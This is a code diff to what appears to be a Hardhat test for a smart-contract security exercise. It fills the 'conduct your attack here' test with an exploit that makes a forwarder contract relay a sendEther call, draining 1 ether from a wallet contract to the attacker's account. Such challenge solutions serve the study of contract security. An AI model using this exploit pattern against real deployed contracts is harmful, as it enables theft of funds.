@@ -6,7 +6,7 @@ const WALLET_NAME = "Wallet";
 const FORWARDER_NAME = "Forwarder";
 const NAME = "Forwarder tests";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
   async function setup() {
     const [, attackerWallet] = await ethers.getSigners();
     const value = ethers.utils.parseEther("1");
@@ -36,7 +36,13 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+        await forwarderContract.functionCall(
+            walletContract.address,
+            walletContract.interface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1")])
+        );
+
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
